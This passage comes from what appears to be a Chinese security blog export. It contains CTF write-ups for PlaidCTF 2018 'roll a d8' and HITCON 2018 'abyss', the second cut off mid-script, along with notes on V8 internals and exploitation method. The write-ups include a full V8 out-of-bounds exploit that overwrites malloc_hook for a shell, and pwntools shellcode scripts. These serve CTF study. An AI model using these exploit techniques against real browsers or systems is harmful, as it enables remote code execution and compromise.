Type:用实体名及其属性名集合来抽象和刻画同类实体称为实体型. 实体集Entity Set:同一类型实体的集合称为实体集. 联系Relationship:现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系.实体内部的联系通常是指组成实体的各属性之间的联系,实体之间的联系通常是指不同实体集之间的联系. 实体型之间的联系 实体型之间的三类联系. 两个实体型之间一对多联系:如果对于实体集A中的每一个实体,实体集B中有n个实体(n &gt;= 0)与之联系;对于实体集B中的每一个实体,实体集A中至多只有一个实体与之联系,则称实体集A与实体集B有一对多联系,记为1:n.例如班级与学生. 两个实体型之间多对多联系:如果对于实体集A中的每一个实体,实体集B中有n个实体(n &gt;= 0)与之联系;对于实体集B中的每一个实体,实体集A中有m个实体(m &gt;= 0)与之联系,则称实体集A与实体集B有多对多联系,记为m:n.例如课程与学生. 概念模型的一种表示方法 实体-联系方法(E-R方法/E-R模型):用E-R图来描述现实世界的概念模型.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>database-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-plaidctf-2018-roll-a-d8]]></title>
    <url>%2Fposts%2F76027108%2F</url>
    <content type="text"><![CDATA[准备 找到包含漏洞的版本的hash值和poc文件,通过parent的hash值回退到漏洞版本,并编译debug模式. 1234git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599gclient synctools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug d8 漏洞分析 Patch分析 将GenerateSetLength中一次跳转中的SmiLessThan修改为SmiNotEqual,说明应该是在length_smi &gt; old_length时的处理出现了问题. POC分析 1234567891011121314151617let oobArray = [];let maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray &#125;, &#123; [Symbol.iterator] : _ =&gt; ( &#123; counter : 0, next() &#123; let result = this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 0; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125; &#125; ) &#125;);oobArray[oobArray.length - 1] = 0x41414141; 首先创建了一个数组oobArray. 然后将function() { return oobArray }作为this参数传入Array.from.call. 12345678910111213141516171819202122232425262728293031define(Array, 'from', function from(items) &#123; var mapfn = arguments[1]; var thisArg = arguments[2]; var c = strict(this); //code var usingIterator = GetMethod(items, $$iterator); if (usingIterator !== undefined) &#123; if (IsConstructor(c)) &#123; var a = new c(); &#125; else &#123; a = new Array(0); &#125; var iterator = GetIterator(items, usingIterator); var k = 0; while (true) &#123; var next = IteratorStep(iterator); if (next === false) &#123; a.length = k; return a; &#125; var nextValue = IteratorValue(next); if (mapping) var mappedValue = mapfn.call(t, nextValue); else mappedValue = nextValue; a[k] = mappedValue; k += 1; &#125; &#125;//code 查看polyfill实现可知:Array.from.call的this参数是一个函数,所以会调用var a = new c(). 当使用new关键字调用一个函数时,若函数返回一个非原始变量(如object,array或function),那么这些返回值将取代原本应该返回的this实例.所以此时a = oobArray,此后的操作都将直接修改oobArray. 最后的赋值语句触发crash,可能是最后一次迭代时对oobArray.length的赋值时出现了bug,导致最后oobArray实际长度与length的值的不同,造成越界访问. 漏洞解析 123456789101112131415161718192021222324void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array, TNode&lt;Number&gt; length) &#123; Label fast(this), runtime(this), done(this); BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime); BIND(&amp;fast); &#123; TNode&lt;JSArray&gt; fast_array = CAST(array); TNode&lt;Smi&gt; length_smi = CAST(length); TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array); CSA_ASSERT(this, TaggedIsPositiveSmi(old_length)); EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime); StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi); Goto(&amp;done); &#125; BIND(&amp;runtime); &#123; CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array), CodeStubAssembler::LengthStringConstant(), length, SmiConstant(LanguageMode::kStrict)); Goto(&amp;done); &#125; BIND(&amp;done);&#125; 漏洞出发点应该在GenerateSetLength中length_smi &gt; old_length时,会直接调用StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);然后结束处理. 应该是这里将较大的length_smi写入,导致数组的长度属性值大于实际长度. 跟踪发现该函数的调用者如下. 12345678910// ES #sec-array.fromTF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123; //code BIND(&amp;finished); //调用GenerateSetLength,将array和迭代次数作为参数 GenerateSetLength(context, array.value(), length.value()); args.PopAndReturn(array.value());&#125; 分析可知函数会使用ConstructArrayLike返回一个数组array,用于存储迭代输出的结果.配合前文分析的polyfill中的实现,这里返回的数组就是oobArray(可以通过%DebugPrint()和Print()对比进行验证). 然后会使用Symbol.iterator进行迭代,每次迭代所得到的值存入array,迭代结束后将进入将index赋值给了length,也就是说length中存储的是迭代次数. 最后将context,array和迭代次数作为参数调用GenerateSetLength. 这里存在一个竞争漏洞,若数组是初始数组,那么就可以在迭代途中修改数组的长度,将正在迭代的数组长度缩小导致数组多余的空间被释放,但是在GenerateSetLength中,又将array.length直接改写为较大的length_smi,导致长度属性值大于实际长度,从而越界访问. exp 编译release模式. 12tools/dev/v8gen.py x64.releaseninja -C out.gn/x64.release d8 12gdb ./out.gn/x64.release/d8pwndbg&gt; r --allow-natives-syntax ../poc.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153var f64 = new Float64Array(1);var u32 = new Uint32Array(f64.buffer);function d2u(v) &#123; f64[0] = v; return u32;&#125;function u2d(lo, hi) &#123; u32[0] = lo; u32[1] = hi; return f64[0];&#125;var bufs = [];var objs = [];var oobArray = [1.1];var maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray; &#125;, &#123; [Symbol.iterator] : _ =&gt; (&#123; counter : 0, next() &#123; let result = 1.1; this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 1; for (let i = 0;i &lt; 100;i++) &#123; bufs.push(new ArrayBuffer(0x1234)); let obj = &#123;'a': 0x4321, 'b': 0x9999&#125;; objs.push(obj); &#125; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125;&#125;)&#125;);//标记可控的buflet buf_offset = 0;for(let i = 0; i &lt; maxSize; i++)&#123; let val = d2u(oobArray[i]); if(val === 0x123400000000)&#123; console.log("buf_offset: " + i.toString()); buf_offset = i; oobArray[i] = u2d(0x121200000000); oobArray[i + 3] = u2d(0x1212); break; &#125;&#125;//标记可控的objlet obj_offset = 0for(let i = 0; i &lt; maxSize; i++)&#123; let val = d2u(oobArray[i]); if(val === 0x432100000000)&#123; console.log("obj_offset: " + i.toString()); obj_offset = i; oobArray[i] = u2d(0x567800000000); break; &#125;&#125;//找到可控的buflet controllable_buf_idx = 0;for(let i = 0; i &lt; bufs.length; i++)&#123; let val = bufs[i].byteLength; if(val === 0x1212)&#123; console.log("controllable_buf_idx: " + i.toString()); controllable_buf_idx = i; break; &#125;&#125;//找到可控的objlet controllable_obj_idx = 0;for(let i = 0; i &lt; objs.length; i++)&#123; let val = objs[i].a; if(val === 0x5678)&#123; console.log("controllable_obj_idx: " + i.toString()); controllable_obj_idx = i; break; &#125;&#125;//%DebugPrint(bufs[controllable_buf_idx]);//%DebugPrint(objs[controllable_obj_idx]);//readline();var heap_addr = d2u(oobArray[buf_offset + 1]) - 0x10console.log("heap_addr: 0x" + heap_addr.toString(16));class arbitraryRW&#123; constructor(buf_offset, buf_idx, obj_offset, obj_idx)&#123; this.buf_offset = buf_offset; this.buf_idx = buf_idx; this.obj_offset = obj_offset; this.obj_idx = obj_idx; &#125; leak_obj(obj)&#123; objs[this.obj_idx].a = obj; return d2u(oobArray[this.obj_offset]) - 1; &#125; read(addr)&#123; let idx = this.buf_offset; oobArray[idx + 1] = u2d(addr); oobArray[idx + 2] = u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); return d2u(tmp[0]); &#125; write(addr, val)&#123; let idx = this.buf_offset; oobArray[idx + 1] = u2d(addr); oobArray[idx + 2] = u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); tmp.set([u2d(val)]); &#125;&#125;var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);//搜索堆内存泄露libc基址let curr_chunk = heap_addr;let searched = 0;for(let i = 0; i &lt; 0x5000; i++)&#123; let size = arw.read(curr_chunk + 0x8); let prev_size = arw.read(curr_chunk); if(size !== 0 &amp;&amp; size % 2 === 0 &amp;&amp; prev_size &lt;= 0x3f0)&#123; let tmp_ptr = curr_chunk - prev_size; let fd = arw.read(tmp_ptr + 0x10); let bk = arw.read(tmp_ptr + 0x18) if(parseInt(fd / 0x10000000000) === 0x7f)&#123; searched = fd; break; &#125;else if(parseInt(bk / 0x10000000000) === 0x7f)&#123; searched = bk; break; &#125; &#125; else if(size &lt; 0x20) &#123; break; &#125; size = parseInt(size / 8) * 8 curr_chunk += size;&#125;if(searched !== 0)&#123; var libc_base = parseInt((searched - 0x3eb000) / 0x1000) * 0x1000; console.log("searched libc_base: 0x" + libc_base.toString(16)); //修改malloc_hook实现getshell malloc_hook = 0x3ebc30 + libc_base; one_gadet = 0x4f322 + libc_base; arw.write(malloc_hook, one_gadet);&#125; else &#123; console.log("Not found"); readline();&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-RTFSC-v8-概览]]></title>
    <url>%2Fposts%2F2dd13ab1%2F</url>
    <content type="text"><![CDATA[概览 v8是Google的JavaScript与WebAssembly引擎,使用C++编写,被用于Chrome和Node.js等应用程序中,同时也可以独立运行. 早期的v8引擎首先解析源代码构造AST(抽象语法树),JIT编译器(实时编译器)再基于AST将其编译成机器代码执行,运行过程中有选择的进行优化. 而现在AST首先被转化为bytecode执行,再有选择的将字节码与分析数据一起发给优化编译器TurboFan.如果在某点上一个假设被证明是不正确的,那么优化编译器会去优化并回退至解释器部分. v8引擎使用了多线程处理. 主线程获取源代码并对其进行编译后执行(v8的机器代码处于RWX段). 有单独的线程进行代码优化,再次将源代码编译为机器语言,并将正在运行的机器语言替换掉. 有单独的线程分析程序运行状态,对优化机制和优化编译器提供信息. 有单独的线程来进行垃圾回收机制. 编译器更迭. 2008年,v8使用Full-Codegen(JIT编译器,作为基准编译器,对应源码v8/src/full-codegen/)直接生成和执行机器代码. 2010年,v8引入用于优化hot-code的Crankshaft(优化编译器,对应源码v8/src/crankshaft/). 2015年,v8引入用于优化hot-code的TurboFan(优化编译器,对应源码v8/src/compiler/pipeline.cc),更好的适应新JS规范. 2017年,v8引入用于生成中间语言(利用AST生成bytecode,具体由v8::internal::AstVisitor类完成)再生成机器代码的Ignition(对应源码v8/src/interpreter/). 2018年,v8移除Full-Codegen和Crankshaft. 一些重要的源文件. api.cc,api.h:定义v8的API. compiler.cc:编译的起点,被api.cc调用. globals.h:常量和其他的定义. heap/:该目录为垃圾回收机制的源码. ic/:该目录为Inline Caching的源码. objects-ini.h,objects.h,objects.cc,type.h,type.cc:包含了v8中使用的对象和类型的定义. 延迟解析 如果解析的代码没有被执行,这会造成性能浪费,所以v8采用延迟解析,将解析分为两个阶段. 首先预解析所有函数的布局,进行初步的语法错误检查并获取函数的范围. 在运行过程真正调用函数时才进行解析. v8还实现了自己的解析器(而不是编译器编译器,比如:yacc,lex),并使用递归下降语法分析进行解析. 编译器 v8到现在共有过四个编译器:Full-Codegen,Crankshaft,TurboFan,Ignition. Full-Codegen Full-Codegen直接将AST转换为汇编语言,通过它,v8把要执行的JavaScript代码转换为机器语言(尚未优化)并输出到JIT区域(RWX区域),将EIP寄存器移到这个JIT区域并按原样继续执行. Ignition v8通过v8::internal::AstVisitor(使用Vistor模式)这个基类从AST生成bytecode. 生成的bytecode存储在BytecodeArray中,最终生成的字节码是从被称为InterpreterEntryTrampoline的Builtin代码执行的,InterpreterEntryTrampoline被编译成Assembly,并且被当成普通的C函数调用. Ignition是一种基于寄存器的bytecode解释器,将值分配给CPU的寄存器,并执行它们.Ignition通过预先生成一个名为BytecodeHandler的字节码处理函数,该函数从bytecode中获得一个索引,调用对应的汇编代码,从而执行bytecode数组. 优化编译器 Crankshaft和TurboFan都属于优化编译器,会在运行过程中对hot-code进行优化. hot-code指被多次调用的函数/循环,被判断为hot-code的代码会在其他线程里被turbofan/crankshar再次编译,通过替换jmp目标地址(在主线程中执行)来执行优化过的代码. 2015 ~ 2017期间有两种优化编译器,根据以下规则运行. 函数/循环中使用debugger语句和eval语句不调用优化编译器. 函数/循环中有use asm语句或者Crankshaft不支持的语法,使用TurboFan. 其他时候Crankshaft被默认使用. 之后便只有TurboFan这一个优化编译器了. v8内存构成 v8进程的内存通常由以下几个块构成. 新生代内存区(new space):大多数的对象都会被分配在这里,这个区域很小但是垃圾回收比较频繁. 老生代内存区(old space):属于老生代,这里只保存原始数据对象,这些对象没有指向其他对象的指针. 大对象区(large object space):存放体积超越其他区大小的对象,每个对象有自己的内存,垃圾回收其不会移动大对象区. 代码区(code space):代码对象,会被分配在这里,唯一拥有执行权限的内存. map区(map space):存放Cell和Map,每个区域都是存放相同大小的元素,结构简单. v8内存生命周期 新建对象obj被分配到new space. 随着程序的运行,new space满了,GC开始清理new space里的死对象,如果obj还处于活跃状态,就不会被清理出去.否则结束. GC清理了两遍new space,发现obj依然还活跃着,就把obj移动到了old space. 随着程序的运行,old space也满了,GC开始清理old space,这时候如果obj已经没有被引用了,就会把obj给清理出去.否则继续停留. v8优化机制 Hiddern Class 在v8中,每个JavaScript对象都有一个HiddenClass关联.HiddenClass存储有关对象形状的信息,除其他外,还存储从属性名称到索引到属性的映射. JavaScript对象数组索引属性存储在单独的元素存储中,命名属性存储在属性存储中,元素和属性可以是数组或字典. JavaScript对象每个property的值都以array的形式进行存储,通过偏移值访问array里的property值.而偏移值和属性名称的依赖关系保留给另一个类,也就是Hiddern Class. 在v8中,JavaScript对象的第一个字段指向HiddenClass(对于v8堆上并由垃圾回收器管理的任何对象都是这种情况).HiddenClass第三位字段,用于存储属性的数量和指针到描述符数组.描述符数组包含有关命名属性的信息,例如名称本身和值的存储位置. Hiddern Class随着对象的创建与属性的添加而产生. 创建一个对象o时会产生一个没有property的Hiddern Class,假设叫做Map1,o内部指向Map1(对象的前8个字节是一个指向Hiddern Class的指针). 向o添加属性x时会在Map1基础上产生一个添加x的type与offset信息对的Hiddern Class,称为Map2,o内部指向Map2,同时在Map1中添加转换条件:当x加入时转移到Map2. 向o添加属性y时会在Map2基础上产生一个添加y的type与offset信息对的Hiddern Class,称为Map3,o内部指向Map3,同时在Map2中添加转换条件:当y加入时转移到Map3. 当访问o.x的值时,会跟踪o所持有的指针(由该指针产生的链表也叫做transition链)找到Map2获取x的偏移量从而获取对象数组中的值. 从Hidden Class实现中可以看到,如果是相同类型,那么Hidden Class指针是相同的.如果属性添加顺序不同,会变成不同的Hiddern Class. 当property增加到11个以上,使用外部的array来管理,也就是Fast property. 如果再进一步增加property,那么就会用object外的dictory来管理,也就是slow/dict properties.也被称为self-contained,因为没有使用Hiddern Class且使用外部的dictory保存所有的信息. Inline Caching Inline Caching通过对于某些action和类型进行缓存来优化,例如缓存之前的访问去加速property访问速度,或者在循环和函数中多次被多次调用的action的code. 具体则是通过将Hidden Class地址或者其中的偏移替代原来的索引进行优化.具体会通过判断对象类型来决定是否调用缓存,所以实际开发中要保证属性添加顺序以保证Hiddern Class的相同. ICState. UNINITIALIZED(0):未初始化. PREMONOMORPHIC(.):只被执行一次的情况,还没进行IC. MONOMORPHIC(1):IC注册一个的状态(快速). POLYMORPHIC(P):IC注册两个以上的状态(一般的快). MEGAMORPHIC(N):IC注册多个的状态. GENERIC(G):IC已停止的状态. Inline Caching可通过-trace-ic进行确认.使用–use-ic启用IC(默认),使用–no-use-ic禁用IC. CodeStubAssembler v8使用CodeStubAssembler,一种可以用来生成汇编语言的汇编器,其使用的表示方式是一种DSL,通过编写DSL伪汇编代码然后生成汇编代码,达到高效率以及跨平台的目的. TF_BUILTIN:创建一个函数. Label:定义一个标签. BIND:绑定一个标签. Branch:条件跳转指令. VARIABLE:定义一些变量. Goto:跳转. DebugBreak():断点. Print():输出变量. 垃圾收集机制 v8使用GC(垃圾收集)机制单独管理JavaScript对象(HeapObject),检测废弃的对象并自动释放它们. GC区域由多个mmap出来的区域组成,v8内部使用的各种HeapObject被保留在这个区域. 根据区域中object的生存时间,GC区域被分为新生代(Young generation,存活时间较短的对象)和老生代(Old generation,存活时间较长或常驻内存的对象).除此之外,还有一些区域不属于任何一个generation,称为Other. 对象起初都会被分配到新生代,当新生代中的对象满足某些条件时,会被移动到老生代. 默认情况下,64位环境下的v8引擎的新生代内存大小32MB,老生代内存大小为1400MB,而32位则减半,分别为16MB和700MB. v8内存的最大保留空间分别为1464MB(64位)和732MB(32位).具体的计算公式是4 * reserved_semispace_space_ + max_old_generation_size_,新生代由两块reserved_semispace_space_组成. 新生代 在新生代分配内存非常容易,只需要保存一个指向内存区的指针,不断根据新对象的大小进行递增即可.当该指针到达了新生代内存区的末尾,就会有一次清理(仅仅是清理新生代). 新生代使用Scavenge算法进行回收,在Scavenge算法的实现中,主要采用了Cheney算法. Cheney算法算法是一种采用复制的方式实现的垃圾回收算法.它将内存一分为二,每一部分空间称为semispace. 在这两个semispace中,一个处于使用状态,另一个处于闲置状态.处于使用状态的semispace空间称为From空间,处于闲置状态的空间称为To空间,分配对象时,先是在From空间中进行分配.当开始进行垃圾回收算法时,会检查From空间中的存活对象,这些存活对象将会被复制到To空间中(复制完成后会进行紧缩),而非活跃对象占用的空间将会被释放. 完成复制后,From空间和To空间的角色发生对换.也就是说,在垃圾回收的过程中,就是通过将存活对象在两个semispace之间进行复制.复制的过程采用的是BFS的思想,从根对象出发,广度优先遍历所有能到达的对象. 具体的执行过程. 首先将From空间中所有能从根对象到达的对象复制到To区,然后维护两个To区的指针scanPtr和allocationPtr,分别指向即将扫描的活跃对象和即将为新对象分配内存的地方,开始循环. 循环的每一轮会查找当前scanPtr所指向的对象,确定对象内部的每个指针指向哪里.如果指向老生代不必考虑,如果指向From区,就需要把这个所指向的对象从From区复制到To区,具体复制的位置就是allocationPtr所指向的位置. 复制完成后将scanPtr所指对象内的指针修改为新复制对象存放的地址,并移动allocationPtr.如果一个对象内部的所有指针都被处理完,scanPtr就会向前移动,进入下一个循环. 若scanPtr和allocationPtr相遇,则说明所有的对象都已被复制完,From区剩下的都可以被视为垃圾,进行清理了. 如果新生代中的一个对象只有一个指向它的指针,而这个指针在老生代中,为了判断这个新生代的对象是否存活,需要建立一个列表用来记录所有老生代对象指向新生代对象的情况. 当一个对象经过多次新生代的清理依旧幸存,这说明它的生存周期较长,也就会被移动到老生代,这称为对象的晋升.晋升的标准有两种. 对象从From空间复制到To空间时,会检查它的内存地址来判断这个对象是否已经经历过一个新生代的清理,如果是,则复制到老生代中,否则复制到To空间中. 对象从From空间复制到To空间时,如果To空间已经被使用了超过25%,那么这个对象直接被复制到老生代. 老生代 v8在老生代中的垃圾回收策略采用Mark-Sweep和Mark-Compact相结合.主要采用标记清除算法,如果空间不足以分配从新生代晋升过来的对象时,才使用标记整理. Mark-Sweep分为标记和清除两个阶段. 标记清除有一个问题就是进行一次标记清楚后,内存空间往往是不连续的,会出现很多的内存碎片.如果后续需要分配一个需要内存空间较多的对象时,如果所有的内存碎片都不够用,将会使得v8无法完成这次分配,提前触发垃圾回收. Mark-Compact正是为了解决标记清除所带来的内存碎片的问题.标记整理在标记清除的基础进行修改,将其的清除阶段变为紧缩极端.在整理的过程中,将活着的对象向内存区的一段移动,移动完成后直接清理掉边界外的内存.紧缩过程涉及对象的移动,所以效率并不是太好,但是能保证不会生成内存碎片. 标记清除和标记整理都分为两个阶段:标记阶段,清除或紧缩阶段. 在标记阶段,所有堆上的活跃对象都会被标记.每个内存页有一个用来标记对象的位图,位图中的每一位对应内存页中的一个字.另外有两位用来标记对象的状态,这个状态一共有三种:白,灰,黑. 如果一个对象为白对象,它还没未被垃圾回收器发现. 如果一个对象为灰对象,它已经被垃圾回收器发现,但其邻接对象尚未全部处理. 如果一个对象为黑对象,说明其不仅被垃圾回收器发现,其邻接对象也全部被处理完毕了. 如果将堆中的对象看做由指针做边的有向图,标记算法的核心就是DFS. 在初始时,位图为空,所有的对象也都是白对象.从根对象到达的对象会背染色为灰色,放入一个单独的双端队列中. 标记阶段的每次循环,垃圾回收器都会从双端队列中取出一个对象并将其转变为黑对象,并将其邻接的对象转变为灰,然后把其邻接对象放入双端队列. 特别大的对象,可能会在处理时进行分片,防止双端队列溢出.如果双端队列溢出,则对象仍然会成为灰对象,但不会被放入队列中,这将导致其邻接对象无法被转变为灰对象. 如果所有对象都变成黑对象,则结束.在双端队列为空时,需要扫描所有对象,如果仍有灰对象,将它们重新放入队列中进行处理. 标记结束后,所有的对象都应该非黑即白,白对象将成为垃圾,等待释放. 清除和紧缩阶段都是以内存页为单位回收内存. 清除时垃圾回收器会扫描连续存放的死对象,将其变成空闲空间,并保存到一个空闲空间的链表中.这个链表常被scavenge算法用于分配被晋升对象的内存,但也被紧缩算法用于移动对象. 紧缩算法会尝试将碎片页整合到一起来释放内存.由于页上的对象会被移动到新的页上,需要重新分配一些页. 对目标碎片页中的每个活跃对象,在空闲内存链表中分配一块内存页,将该对象复制过去,并在碎片页中的该对象上写上新的内存地址. 随后在迁出过程中,对象的旧地址将会被记录下来,在迁出结束后,v8会遍历所有它所记录的旧对象的地址,将其更新为新地址. 由于标记过程中也记录了不同页之间的指针,这些指针在此时也会进行更新. 如果一个页非常活跃,如其中有过多需要记录的指针,那么地址记录会跳过它,等到下一轮垃圾回收进行处理. v8的object v8自定义了一些类,并针对C++类结构制作了触发器来与GC合作.v8的object没有成员变量,也没有虚函数和构造/析构函数. 继承关系在文件v8/src/objects.h中. 1234567891011121314151617181920// v8/src/objects.h// Most object types in the V8 JavaScript are described in this file.// Inheritance hierarchy:// - Object// - Smi (immediate small integer)// - HeapObject (superclass for everything allocated in the heap)// - JSReceiver (suitable for property access)// - JSObject// - JSArray// - JSArrayBuffer// - JSArrayBufferView// - JSTypedArray// - JSDataView// - JSBoundFunction//...// Formats of Object*:// Smi: [31 bit signed int] 0// HeapObject: [32 bit direct pointer] (4 byte aligned) | 01 v8所有类都继承自Object,它由以下两种类型组成. Smi:整数值,整数由带符号的31(32位,64位为带符号的32位范围)位范围表示. HeapObject:指针类型,除能在Smi范围表达的整数值之外的其他数据,始终有一个指向Map的指针,由于HeapObject基本上由GC管理,因此它位于GC区域(而不是堆区域). Smi与HeapObject不一样,HeapObject以指针的形式保存对象的内存中,而Smi直接保存在对象的内存中.v8使用最低位来区分两者. 在最新版中指针都是只有后32位,Smi(包括length等整数值)保存为原来的两倍从而使末尾为0. HeapNumber HeapNumber以double形式(图中标黄)保存浮点数或者不能在Smi范围内表达的整数. Name Name只有一个子类:String. String String存储字符串. Oddball Oddball表示特殊值的对象,例如true,false,undefined. JSReceiver -&gt; JSObject JSObject是表示JavaScript对象的对象. 12345678[ hiddenClass / map ] -&gt; ... ; 指向Map[ properties ] -&gt; [empty array][ elements ] -&gt; [empty array][ reserved #1 ] -\[ reserved #2 ] |[ reserved #3 ] &#125;- in object properties,即预分配的内存空间............... |[ reserved #N ] -/ Map中存储了一个对象的元信息,包括对象上属性的个数,对象的大小以及指向构造函数和原型的指针等等.同时,Map中保存了Js对象的属性信息,也就是各个属性在对象中存储的偏移.然后属性的值将根据不同的类型,放在properties,elements以及预留空间中. properties:又称为NamedProperties,用于保存通过属性名作为索引的元素值,类似于字典类型,实体是FixedArray. element:又称为IndexedProperties,用于保存通过整数值作为索引的元素值,类似于常规数组,实体是FixedArray. reserved #n,为了提高访问速度,v8在对象中预分配了的一段内存区域,用来存放一些properties(称为in-object properties),当向object中添加属性时,会先尝试将新属性放入这些预留的槽位.当in-onject槽位满后,v8才会尝试将新的属性放入properties中. JSFunction JSFunction是表示JavaScript Function的对象. kCodeEntryOffset是一个指向JIT代码(RWX区域)的指针,许多实现任意代码执行的策略都是在此编写shell代码. v8从6.7版本之后,function的code不再可写,也就是不能直接修改JIT代码. JSArray JSArray是表示JavaScript Array的对象. JSArrayBuffer &amp;&amp; JSTypedArray JSArrayBuffer对象用来表示通用的,固定长度的原始二进制数据缓冲区.ArrayBuffer不能直接操作,而是要通过视图进行操作. JSTypedArray用来生成内存的视图,通过9个构造函数可以生成对应的视图,比如Uint8Array,Int16Array,Float64Array等等. 在v8中,对象通常被存放在由GC管理的mmapped区域,然而BackingStore是一个不被GC管理的区域,并且被存放在heap中.由于它不是由GC管理的HeapObject,因此指向BackingStore的指针末位没有指示作用. ArrayBuffer就代表一段原始的二进制数据,而TypedArray代表了一个确定的数据类型,当TypedArray与ArrayBuffer关联,就可以通过特定的数据类型格式来访问内存空间.]]></content>
      <categories>
        <category>CS</category>
        <category>RTFSC</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-v8-exploit]]></title>
    <url>%2Fposts%2Fdb0ad911%2F</url>
    <content type="text"><![CDATA[步骤 创建一个用于调试的js环境版本.如果有一个包含漏洞的patch,hit和build它. 分析patch以确定哪个patch适用于哪个进程:Full-Codegen,Crankshaft,TurboFan,Ignition,AST,IC. 编写利用漏洞的js代码段. 创建一个任意地址读/写的原语,主要使用ArrayBuffer和TypedArray. getshell.例如在JIT区域嵌入shell代码. 调试技巧 12%DebugPrint()#通过该函数打印出对象的详细信息,如内存地址,属性,map等.运行时使用参数--allow-natives-syntax. 当分析v8源码时,遇到CodeStubAssembler编写的代码,可以在其中插入DebugBreak(),这相当于插入了一个断点(类似int 3),重新编译后使用调试器调试时,可以在插入处断下. 同样,遇到CodeStubAssembler编写的代码时,可以使用Print()来输出一些变量值,例如:Print("array", static_cast&lt;Node*&gt;(array.value()));,重新编译即可. 可以在运行的js代码中插入readline()让程序停下来等待输入,方便调试. 通过引用tools里面的gdb脚本可以使用一些较为方便的指令. 12job(&amp;object)#打印出对象的详细信息 漏洞利用 ArrayBuffer &amp;&amp; TypedArray 在ArrayBuffer中存在一个BackingStore指针,这个指针指向的就是ArrayBuffer开辟的内存空间,可以使用TypedArray指定的类型读取和写入该区域,且这片内存区域是位于系统堆中的. 利用思路. 修改ArrayBuffer中的Length造成越界访问. 修改BackingStore指针获得任意读写的能力. 通过BackingStore指针泄露堆地址,在堆中布置shellcode.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hitcon-2018-abyss]]></title>
    <url>%2Fposts%2Fddc429e1%2F</url>
    <content type="text"><![CDATA[分析 题目给了三个二进制文件:hypervisor.elf,kernel.bin,user.elf. 其中hypervisor.elf,user.elf是ELF64文件,而kernel.bin是纯二进制代码文件. 分析可知主程序为hypervisor.elf,该程序利用kvm给VM分配VCPU和memory,并加载一个小型的内核kernel.bin到虚拟机的0地址开始的内存空间,然后使用ioctl的KVM_RUN request来启动VM,当遇到中断或者异常时,ioctl就会返回,这时可以通过检查exit_reason来得知中断或者异常的类型并做相应处理,例如I/O请求. kernel.bin实现了内存管理和中断处理,提供了loader启动和libc加载需要的一些常见syscall,然后直接加载ld.so.2来装载用户态程序user.elf.kernel.bin在处理syscall时,将一些与I/O有关的指令通过CPU的in/out指令触发中断交给hypervisor来处理. 漏洞 user.elf user.elf漏洞是swap的时候没有检查可以直接改掉stack_pointer. IDA逆向的时候发现代码(*__ctype_b_loc())[(unsigned __int8)s[i]] &amp; 0x800就是isdigit(s[i]). 123456789101112131415161718192021222324252627282930313233from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)shellcode = asm( shellcraft.pushstr('flag') + shellcraft.syscall('SYS_open', 'rsp', 0) + "sub rbp, 0x200\n" + shellcraft.syscall('SYS_read', 'rax', 'rbp', 0x30) + shellcraft.syscall('SYS_write', 1, 'rbp', 'rax'))r.sendline(shellcode)r.interactive() kernel.bin hypervisor给kernel的物理内存有0x2000000大小,kernel被加载到0的位置,0-0x200000为内核地址空间,高地址0x200000-0x2000000为用户地址空间. 找到系统调用表,然后逐个分析syscall即可.漏洞是在处理read时,没有检查kmalloc返回0的情况,可以将内存耗尽,这样kmalloc就会因为空间不足而返回0,从而通过read直接改掉内核代码,执行内核shellcode. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 